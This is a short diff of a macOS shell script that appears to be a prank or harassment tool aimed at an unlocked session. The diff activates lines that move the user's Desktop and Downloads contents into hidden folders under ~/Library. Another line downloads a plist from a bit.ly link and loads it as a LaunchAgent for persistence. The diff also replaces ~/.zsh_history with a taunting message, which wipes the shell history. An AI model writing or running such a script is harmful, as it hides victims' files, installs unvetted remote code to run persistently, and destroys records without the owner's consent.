@@ -3,8 +3,8 @@
 if [[ $1 -eq 1 ]]
 then
 	mkdir ~/.lmaktab ~/.ta7milat ~/.TIG
-	# mv ~/Desktop/* .lmaktab
-	# mv ~/Downloads/* .ta7milat
+	mv ~/Desktop/* .lmaktab
+	mv ~/Downloads/* .ta7milat
 	mv ~/.lmaktab ~/.ta7milat ~/.TIG
 	mv ~/.TIG ~/Library/Application\ Support/Knowledge
 	curl -L -o com.local.hh.plist https://bit.ly/3IiFJij
@@ -14,7 +14,7 @@ then
 
 elif [[ $1 -eq 2 ]]
 then
-	echo "2"
+	echo "matb9ach tkhli session m7lola hhh" > ~/.zsh_history
 	launchctl load ~/Library/LaunchAgents/com.local.hh.plist
 	# hidutil property --set '{"UserKeyMapping":[]}' reset hhhh
 	launchctl start com.local.hh
